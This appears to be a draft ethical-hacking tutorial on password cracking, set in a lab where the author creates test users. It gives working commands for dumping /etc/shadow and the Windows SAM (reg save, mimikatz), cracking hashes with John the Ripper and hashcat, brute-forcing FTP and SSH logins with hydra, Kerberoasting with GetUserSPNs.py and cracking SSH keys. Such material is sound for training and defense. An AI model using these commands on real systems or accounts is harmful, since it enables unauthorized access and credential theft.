---
title: Password Cracking Tools and Techniques
summary: Use of different tools to used for cracking password
description: Use of different tools to used for cracking password
slug: '/password-cracking-tools-and-techniques'
tags: ['ethical hacking', 'penetration testing', 'john the ripper', 'hashcat']
draft: true
---

## Intro

### Dictionary Attacks

> CeWL (Custom Word List generator) is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper.

| Type            | Path                                |
| --------------- | ----------------------------------- |
| John The Ripper | /usr/share/john/password.lst        |
| Rock You        | /usr/share/wordlists/rockyou.txt.gz |

```bash
locate wordlists

gzip -d /usr/share/wordlists/rockyou.txt.gz rockyou.txt
or
gunzip /usr/share/wordlists/rockyou.txt.gz rockyou.txt
```

## Exploration

### Linux

In Linux, the `/etc/passwd` file contains potentially important metadata in the GECOS field, including full name, room number, work phone, home phone, and others. Linux stores password hashes in the `/etc/shadow` file, which is why you need to use the sudo command to view it.

```bash
cat /etc/passwd
sudo cat /etc/shadow
```

The `unshadow` utility combines the /etc/passwd and /etc/shadow files. This is done so that John the Ripper can attempt to crack the password with information from both files, using a single file.

```bash
sudo unshadow /etc/passwd /etc/shadow > combined.txt
```

## Exploitation

### Linux Password

> Kali Linux 2021.1 changed the hash function for passwords from sha512crypt (listed as $6$ in the /etc/shadow file) to yescrypt (listed as $y$ in the /etc/shadow file).

```bash
sudo adduser vulnuser (room number: 8848.86 password vulnuser8848.86)
# [Your First Name] user a password of [Your Second Name] (you will not
# see anything on the screen when you type the password). Press ENTER for all the subsequent
# prompts (Full Name, Room Number, Work Phone, Home Phone, and Other) until the last prompt,
# which asks “Is the information correct? [Y/n].
```

#### John The Ripper

> John the Ripper will not attempt to crack a password it has already cracked.

```bash
sudo john --wordlist=/usr/share/john/password.lst --format=crypt combined.txt
# By the time you are reading this, support for the $y$ hashes might
# be incorporated into John the Ripper, which would mean you could leave off --format=crypt
# for some speedup
sudo john --show --format=crypt combined.txt # See all passwords already cracked.
sudo rm /root/.john/john.pot # To remove remembered password.

sudo john --format=crypt combined.txt # By default single crack mode, uses the GECOS field, without wordlist.

sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt combined.txt
```

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 faiz.txt
```

#### hashcat

```bash
hashcat -m 13100 hash passlist.txt # -m refers to hash type
```

#### hydra

```bash
hydra -L username.txt -P /usr/share/wordlists/rockyou.txt ftp <target-ip-addr> -vV # Target FTP
  -L username file
  -l username
  -P password file
  -p password

hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target-ip-addr> -vV
```

#### GetUserSPNs.py

> Note: If there is misconfigured account, we can obtain the credentials from Active Directory using `GetUserSPNs`.

```bash
GetUserSPNs.py -dc-ip <target-windows-ip-addr> <host>/<user>:<pass> -request
```

### Windows Password

Creating user:

- Click the **Start** button or in the search box, type **Computer Management**, and select **Computer Management**. This opens the **Computer Management Console**.
- Expand **Local Users and Groups** in the pane at the left.
- Click **Users** to see all the current local user accounts.
- Right-click on a blank area in the right pane and select **New User**.
- Fill in the fields, creating a four-digit password with just lowercase letters.
- Clear the checkbox next to User Must Change Password At Next Logon and click the **Create**

```powershell
reg save hklm\SAM sam.hiv
reg save hklm\SYSTEM system.hiv

mimikatz
> privilege::debug
> token::elevate

# Send the next command’s output to a text file called hashes.txt:
> log hashes.txt

# Output the usernames and hashes for all accounts on the system:
> lsadump::sam sam.hiv system.hiv
```

e.g. windowshashes.txt

```txt
Beatles:5be2f274f2f80c5d4d0c597f023f4f61::::
StarWars:b7c899154197e8a2a33121d76a240ab5::::
```

#### John The Ripper

```bash
sudo crunch 4 4 | sudo john --format=NT windowshashes.txt --stdin # Brute force of 4 character.

sudo john --format=NT windowhashes.txt

sudo john --show --format=NT windowshashes.txt
```

### SSH Pass key

```bash
./opt/john/ssh2john.py id_rsa > ssh_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
```

## Remediation

- Account Lockout.
